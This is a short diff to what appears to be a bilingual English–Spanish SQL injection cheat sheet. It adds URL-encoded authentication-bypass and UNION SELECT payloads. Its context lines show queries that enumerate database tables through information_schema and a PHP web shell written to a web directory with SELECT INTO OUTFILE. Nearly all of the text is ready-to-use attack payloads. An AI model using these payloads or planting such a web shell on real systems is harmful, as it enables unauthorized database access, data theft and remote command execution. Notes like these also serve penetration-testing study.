@@ -3,6 +3,7 @@
 - Boolean conditions such as `OR 1=1` and `OR '1'='1`, and look for differences in the application's responses.
 ## Subverting application logic
 ```java
+'+OR+1=1+--+-
 ' OR 1=1 -- -
 ' OR '1'='1
 ') OR 1=1 -- -
@@ -26,8 +27,10 @@ For a `UNION` query to work, two key requirements must be met:
 - The data types in each column must be compatible between the individual queries.
 ```java
 ' ORDER BY 2-- - Calcula la cantidad de columnas
+'+ORDER+BY+2--+-
 ' UNION SELECT NULL, NULL, NULL, NULL -- - Calcula la cantidad de columnas
 ' UNION SELECT 1, 2, 3, 4 -- - Ver que columnas se muestran en el front end
+'+UNION+SELECT+1,+2,+3,+4+--+-
 ' UNION SELECT NULL FROM DUAL-- cuando es Oracle
 ' UNION SELECT current_user(),user(),database(), @@version-- -
 ' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'-- -
@@ -103,3 +106,4 @@ note: debe ser junto `<?php`
 
 <? php system ($_REQUEST[0]); ?>
 select '<? php $_GET['cmd'] ?> ' into outfile  "/var/www/chattr-prod/whell.php"
+
